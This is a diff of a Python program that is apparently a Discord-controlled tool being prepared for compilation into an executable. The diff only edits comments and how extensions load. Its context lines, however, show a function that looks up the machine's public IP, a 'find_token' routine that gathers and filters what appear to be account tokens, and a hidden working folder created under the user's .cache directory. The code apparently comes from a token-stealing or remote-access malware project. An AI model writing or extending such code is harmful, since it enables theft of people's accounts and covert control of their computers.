@@ -8,7 +8,8 @@ from datetime import datetime
 from socket import create_connection
 import os, re, aiohttp, requests, random
 
-###################################################################
+############### Global functions available in every cog
+
 def IP():
     try: return requests.get("http://icanhazip.com/").text.rstrip()
     except: return "127.0.0.1"
@@ -68,7 +69,8 @@ def find_token(self):
     for t in tokens:
         if englishOnly(t): goodTKs.append(t)
     return goodTKs
-###################################################################
+
+############### Custom bot implementation for functions 
 
 original_dir = os.getcwd()
 
@@ -92,7 +94,7 @@ nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"
 if os.path.isdir(nr_working) != True:
     os.mkdir(nr_working)
     
-###################################################################
+############### Function for on_ready
     
 @client.event
 async def on_ready():
@@ -184,8 +186,9 @@ extensions = (
 )
 
 for ex in extensions:
-    client.load_extension("modules."+ex)
-
+    #client.load_extension("modules."+ex) // For testing without compiler
+    client.load_extension(ex) # For compiler
+    
 ############### Bot Startup
 def is_connected():
     try: create_connection(("1.1.1.1", 53)); return True
